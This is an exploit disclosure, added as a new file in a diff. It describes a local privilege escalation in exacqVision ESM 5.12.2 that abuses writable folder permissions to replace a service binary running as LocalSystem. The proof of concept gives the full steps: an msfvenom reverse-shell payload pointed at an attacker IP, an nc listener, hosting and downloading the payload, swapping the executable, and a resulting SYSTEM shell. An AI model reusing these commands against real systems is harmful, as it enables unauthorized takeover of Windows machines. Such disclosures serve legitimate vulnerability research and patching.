@@ -1,0 +1,75 @@
+# Exploit Title:  exacqVision ESM 5.12.2 - Privilege Escalation
+# Exploit Author: bzyo
+# Twitter: @bzyo_
+# Date: 2019-02-13
+# Vulnerable Software: 
+# http://cdnpublic.exacq.com/5.12/exacqVisionEnterpriseSystemManager_5.12.2.150128_x86.exe
+# Vendor Homepage: https://www.exacq.com
+# Version: 5.12.2.150128
+# Tested Windows 7 SP1 x86 and Windows 10 x64
+
+# Description:
+# exacqVision ESM 5.12.2 suffers from Privilege Escalation due to insecure file permissions
+
+# Prerequisites
+# Local, Low privilege access with restart capabilities
+
+# Details
+# By default the Authenticated Users group has the modify permission to ESM folders/files as shown below.  
+# A low privilege account is able to rename the enterprisesystemmanager.exe file located in 
+# this same path and replace with a malicious file that would connect back to an attacking computer giving system level privileges 
+# (nt authority\system) due to the service running as Local System.  While a low privilege user is unable to restart the service 
+# through the application, a restart of the computer triggers the execution of the malicious file.
+
+# note: during install, you cannot choose a folder containing spaces i.e. "program files"
+
+C:\>icacls exacqVisionEsm
+exacqVisionEsm NT AUTHORITY\NETWORK SERVICE:(RX)
+               win7-32bit\bob:(RX)
+               BUILTIN\Administrators:(I)(F)
+               BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+               NT AUTHORITY\SYSTEM:(I)(F)
+               NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
+               BUILTIN\Users:(I)(OI)(CI)(RX)
+               NT AUTHORITY\Authenticated Users:(I)(M)
+               NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
+
+Successfully processed 1 files; Failed processing 0 files
+
+
+C:\>sc qc "exacqVision Enterprise System Manager Web Service"
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: exacqVision Enterprise System Manager Web Service
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : "C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe"
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : ESMWebService
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+# Proof of Concept
+1. Generate malicious .exe on attacking machine
+  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.163 LPORT=443 -f exe > /var/www/html/enterprisesystemmanager.exe
+
+2. Setup listener and ensure apache is running on attacking machine
+  nc -nlvvp 443
+  service apache2 start
+ 
+3. Download malicious .exe on victim machine
+  Open browser to http://192.168.0.163/enterprisesystemmanager.exe and download
+
+4. Rename C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe
+   enterprisesystemmanager.exe > enterprisesystemmanager.bak
+ 
+5. Copy/Move downloaded enterprisesystemmanager.exe file to C:\exacqVisionEsm\EnterpriseSystemManager\
+
+6. Restart victim machine and login as low privileged user 
+
+7. Reverse Shell on attacking machine opens
+	C:\Windows\system32>whoami
+	whoami
+	nt authority\system
